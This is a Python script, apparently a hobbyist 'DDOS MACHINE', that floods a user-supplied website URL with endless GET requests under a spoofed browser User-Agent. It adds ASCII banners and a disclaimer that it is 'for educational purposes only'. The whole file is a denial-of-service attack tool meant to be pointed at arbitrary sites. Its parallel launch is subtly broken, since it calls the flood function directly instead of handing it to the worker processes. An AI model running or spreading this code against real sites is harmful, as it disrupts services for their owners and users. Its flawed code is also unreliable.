####################################
#    Copyright (c) 2021 Ram9       #
#          DDOS MACHINE            #
#                                  #
#     CREATED FOR EDUCATIONAL      #
#         PURPOSES ONLY            #
#                                  #
####################################

from multiprocessing import Process
from datetime import datetime
from requests import get
from colorama import Fore, Back, Style
from os import system, name
from time import sleep

def DDOS(url):
    try:
        while True:
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")

            attack = get(url, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
            code = attack.status_code # Loops and sends requests, and each time, it checks the status-code
            if int(code) == 200: # 200 Means it connected successfully
                print(f"{Fore.GREEN}[✔] Request Sent | Status Code: 200 | {current_time}")
            else:
                print(f"{Fore.RED}[⚠️] Error | Status Code: {code} | {current_time}")
    except KeyboardInterrupt: # Try/except for if the user decides to end mid-way
        print()
        print()
        print("Proccess Has Been Force-Ended [CTRL + C]")

def clear(): # Command to clear terminal
    if name == 'nt': #(os.name) is the OS
        command = system('cls') 
    else:
        command = system('clear') # Diffrent OSs have diffrent terminal clearing commands for os
    return command

def main():
    print(f'''{Fore.BLUE}

    ██████╗░██████╗░░█████╗░░██████╗  ███╗░░░███╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗███████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ████╗░████║██╔══██╗██╔══██╗██║░░██║██║████╗░██║██╔════╝
    ██║░░██║██║░░██║██║░░██║╚█████╗░  ██╔████╔██║███████║██║░░╚═╝███████║██║██╔██╗██║█████╗░░
    ██║░░██║██║░░██║██║░░██║░╚═══██╗  ██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══╝░░
    ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║███████╗
    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝

                                        by Ram9
    ''')
    print()
    sleep(0.5)
    try:
        url = input("Enter Site URL Here: ")
        amount = int(input("Enter DDOS Strength (Number): ")) # Strength is just how many loops you want at the same time
        attack = get(url, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}) # Headers are not really neccesary I believe ... Might as well leave it in to be safe
        code = attack.status_code # The reason I am running this here even though it is in DDOS() is just to check for errors
    except:
        print("Invalid Input, Restart Program And Try Again.")
        exit()
    print("Upon Starting DDOS Proccess, I Am Not Responsible For Anything That May Occur Due To Use Of My Script\nAs It Was Made For Experimental Use/Educational Purposes Only ...")
    print()
    sleep(0.5)
    print()
    print()
    print("Press 'ENTER' To Continue")
    input()
    print()
    print()
    print("Be Aware, Proccess Will Only End If An Error Occurs Or If Your Computer Crashes\nIf You Would Like To Cancel Mid-Way, Press'CTRL + C' To End.")
    clear()
    sleep(0.25) # heheh edgy reaper
    print (f'''{Fore.BLUE}
---------------------------------------------------
                   ...
                 ;::::;   DDOS ATTACK STARTING...
               ;::::; :;    By Ram9
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
---------------------------------------------------
    ''')
    sleep(0.75)
    print()
    threads = []
    for i in range(amount): # Adds amount of loops into a list and has the function start at the at the same time as the others 
        threads.append(Process(target = DDOS(url)))
    for t in threads:
        t.start() # The actual start part

if __name__ == "__main__": # Idk what this is ... isn't name always main??
    main()